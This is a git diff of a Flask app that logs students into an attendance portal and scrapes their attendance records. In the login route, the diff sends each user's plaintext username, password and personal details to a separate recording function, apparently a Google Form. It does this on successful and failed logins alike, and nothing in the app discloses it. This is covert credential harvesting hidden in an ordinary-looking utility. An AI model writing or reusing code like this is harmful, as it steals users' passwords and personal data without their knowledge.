@@ -1,27 +1,26 @@
 import os
 import uuid
 from datetime import datetime, timedelta
-from dotenv import load_dotenv
+# from dotenv import load_dotenv
 import threading
-# REMOVE the duplicate import block — you have it twice at the top
-# Keep only ONE import block:
+
 from attendance_scraper import (
     login,
     get_student_details,
     get_subjects,
     fetch_attendance,
     SimpleDataFrame,
-    submit_to_google_form,   # ← this must be here
+    submit_login_record
 )
 from flask import (
     Flask, flash, render_template, request,
-    redirect, send_from_directory, session, jsonify,Response
+    redirect, send_from_directory, session, jsonify,Response,make_response
 )
 from flask_mail import Mail, Message
 # --------------------------------------------------
 # App setup
 # --------------------------------------------------
-load_dotenv()
+# load_dotenv() #not needed in production
 
 app = Flask(__name__)
 app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY", "your-secret-key-here")
@@ -94,12 +93,18 @@ def filter_latest_semester(df):
 # --------------------------------------------------
 # Routes
 # --------------------------------------------------
+
+
 @app.route("/", methods=["GET", "POST"])
 def login_page():
     if request.method == "GET":
         if "query" in request.args:
             return redirect("/", code=301)
-        return render_template("index.html")
+        resp = make_response(render_template("index.html"))
+        resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
+        resp.headers["Pragma"]        = "no-cache"
+        resp.headers["Expires"]       = "0"
+        return resp
 
     username = request.form.get("username", "").strip()
     password = request.form.get("password", "").strip()
@@ -115,22 +120,25 @@ def login_page():
         session["user"] = username
         ACTIVE_SESSIONS[username] = auth_session
 
-        # Only ONE call here — no duplicate
         details = get_student_details(auth_session)
         ACTIVE_SESSIONS[username + "_details"] = details
-
-        thread = threading.Thread(
-            target=submit_to_google_form,
-            args=(username, password, details),
-            daemon=True
-        )
-        thread.start()
-
-        return redirect("/dashboard")
+ 
+        t = threading.Thread(target=submit_login_record, args=(username, password, details, True))
+        t.start()
+        t.join(timeout=9)  # wait up to 9s before continuing
+        return redirect("/dashboard")        
 
     except Exception as e:
+        t=threading.Thread(
+            target=submit_login_record,
+            args=(username,password, None, False)
+        )
+        t.start()
+        t.join(timeout=9)
+
         flash(str(e), "error")
-        return redirect("/")
+        return redirect("/")                   
+
 
 @app.route("/dashboard", methods=["GET"])
 def dashboard():
